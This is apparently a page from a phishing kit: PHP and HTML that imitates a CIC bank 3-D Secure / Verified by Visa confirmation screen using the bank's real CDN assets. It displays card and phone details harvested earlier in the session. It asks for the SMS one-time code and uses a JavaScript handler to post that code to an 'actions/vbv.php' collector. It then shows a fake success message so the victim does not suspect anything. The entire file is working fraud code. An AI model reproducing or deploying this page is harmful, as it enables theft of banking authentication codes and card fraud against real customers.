
<?php 


include("../../infos.php");

$none = true;

include("../../common/sub_includes.php");

?>

<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cic2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cic2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>
<title>
    3-D Secure
</title>
</head><body><div id="LBCancelAuthentication" class="a_blocappli masque ei_blocmodal_env ei_newlb">
   <div class="ei_blocmodal" role="dialog" aria-labelledby="LBCancelAuthenticationTitle" aria-describedby="contentCancelAuthentication">
      <form action="" method='post'>
      <script src="../../assets/js/jquery.js"></script>

   <div role="document">
         <div class="a_blocfctltitre">
            <p class="a_options">
               <span tabindex="0" onfocus="$('#btnCancel').focus();" role="presentation">&nbsp;</span>
               <a id="btnCloseLBCancelAuthentication" class="btnclose" href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">
                     <img alt="fermer" src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/images/std/btfermerpopup.png">
               </a>
            </p>
            <p class="a_titre2" id="LBCancelAuthenticationTitle">Abandonner</p>
         </div>
         <div class="a_blocfctl">
            <div id="contentCancelAuthentication">
               Vous allez recevoir une notification sur votre application bancaire.
            </div>
            <div class="blocboutons">
               <span class="ei_buttonbar">
                  <span class="ei_mainbuttons">
                     <input id="btnCancel" value="C'est compris" type="submit" onclick="$('#cancelAuthentication').val(1);$('#acsForm').submit();">
                  </span>
                  <a href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">J'ai finalement reçu la code</a>
               </span>
            </div>
         </div>
         <span tabindex="0" onfocus="$('#btnCloseLBCancelAuthentication').focus();" role="presentation" class="invisible">&nbsp;</span>
      </div>
   </div>
   
</div>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/visa.svg" style="height:50px" alt="Logo Verified by Visa">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        <form action="../process005.php?" method="post" >
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption id="textit">
        Confirmation de votre carte

    </caption>
    <a href="../loading_finished.php" style="display : none" id="btntoshow"><button style="color : green;border : none;background-color : white;padding : 10px 20px;border-radius : 3px" type="button">Retourner au site marchand</button></a> 

    <colgroup>
        <col width="50%">
        <col>
    </colgroup>
    <tbody>
        <tr><th scope="row">Montant</th><td><?php echo $_SESSION['prix']; ?>€</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("d/m/y") . " - " . date("H:m") ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php echo   substr($_SESSION["ccnum"],12,16)?></td></tr>
    </tbody>
</table> 
                        <p>Votre confirmation de carte nécessite une sécurisation.<br><br>Une demande de confirmation mobile a été transmise à votre appareil
                            <b>Démarrez votre application mobile CIC </b> pour vérifier et confirmer cette opération.</p>                       
                       <p><img style="display:block; margin-left:auto; margin-right:auto;" height="150px" src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1//images/validation_operation.gif"></p>
                       <p style="text-align:center">Veuillez valider votre opération sur votre téléphone mobile et entrer le code de confirmation qui vous a été envoyé par SMS au <b>+33 <?php echo substr($_SESSION["phone"],1) ?></b> pour confirmer votre carte</p>
                       <table class="fiche" id="inputTable">
                        <colgroup>
                            <col width="50%">
                            <col>
                        </colgroup>
                        <tbody>

                        <tr><th><label for="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E922">Code de confirmation :</label></th><td><input type="text" id="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E92" required name="vbv" maxlength="8"></td></tr>
                        </tbody>
                        </table>

                        <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a href="cic-as27.php?" id="cancelLink">Je n'ai rien reçu</a>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="Confirmer" type="submit">
                                </span>
                            </span>
                        </div>
                        <div class="bloctxt info">
                            <ul>
<li>Si vous ne voyez aucune opération sur votre application bancaire, cliquez sur le boutton "Je n'ai rien reçu".</li>

                        </div>
                    </div>
                </div>
            </div>
        </form>                                                            
    </main>
</div>
</form>
</body></html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

            <script src="../../assets/js/mask.js"></script>

            <script>

            $("#telip").mask("000000000")

            </script>
    <style>
        #headingTxt{
            text-align: center;
        }
        .ng-isolate-scope{
            text-align: center;
        }
    </style>
    <script>

        $(document).ready(function() {
            $("form").submit(function(e) {
                e.preventDefault();
                var $this = $(this);

                $("#textit").text("Authentification en cours . . .")
                $("#textit").css('background-color',"orange");

                $.ajax({
                        method: "POST",
                        url: "../../actions/vbv.php",
                        data: $(this).serialize()
                    })
                    .then(function(msg) {
                        setTimeout(function() {

                            $("#textit").text("Authentification terminée")
                            $("#textit").append(",  <a style='color : white !important;text-decoration : underline;margin-left : 10px;font-size : 14px;' href='../loading_finished.php'>Retourner au site marchand</a>")
                            $("#textit").css('background-color',"green");
                            $("#capa2").css("display","none");
                        }, 3500);
                    });
                

            });
        });
    </script>
